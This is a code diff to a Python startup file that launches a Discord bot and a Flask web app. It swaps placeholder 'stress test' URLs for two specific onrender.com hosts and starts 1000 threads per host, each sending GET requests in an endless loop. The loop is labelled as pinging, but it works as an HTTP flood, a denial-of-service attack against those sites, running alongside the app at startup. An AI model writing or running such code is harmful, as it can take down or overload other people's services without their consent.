@@ -3,46 +3,31 @@ from app.bot import start_bot
 from app.web import app
 import requests
 
-# List of slow endpoints
+# Your actual ping targets
 TARGETS = [
-    "https://your-app.onrender.com/slow",
-    "https://your-app.onrender.com/leak"
+    "https://ere-dv2x.onrender.com/recent-pets",
+    "https://premium-github-io.onrender.com/recent-pets"
 ]
 
 CONCURRENCY = 1000
 TIMEOUT = 30  # seconds
 
-
-# Function to send one request to a target
-def stress_target(url, index):
-    try:
-        res = requests.get(url, timeout=TIMEOUT)
-        print(f"[{index}] {url} → {res.status_code}")
-    except Exception as e:
-        print(f"[{index}] {url} → ERROR: {e}")
-
-
-# Function to run stress test in loop
-def run_slow_leak_stress():
+def ping_site_continuous(url, thread_index):
     while True:
-        threads = []
-        for i in range(CONCURRENCY):
-            for url in TARGETS:
-                t = Thread(target=stress_target, args=(url, i))
-                t.start()
-                threads.append(t)
-        
-        # Wait for all threads to finish
-        for t in threads:
-            t.join()
-
+        try:
+            response = requests.get(url, timeout=TIMEOUT)
+            print(f"[Thread {thread_index}] Pinged {url} with status {response.status_code}")
+        except Exception as e:
+            print(f"[Thread {thread_index}] Error pinging {url}: {e}")
 
 # Start Discord bot
 Thread(target=start_bot, daemon=True).start()
 
-# Start stress test thread
-Thread(target=run_slow_leak_stress, daemon=True).start()
+# Start ping threads
+for url in TARGETS:
+    for i in range(CONCURRENCY):
+        Thread(target=ping_site_continuous, args=(url, i), daemon=True).start()
 
-# Start web server
+# Start Flask web app
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
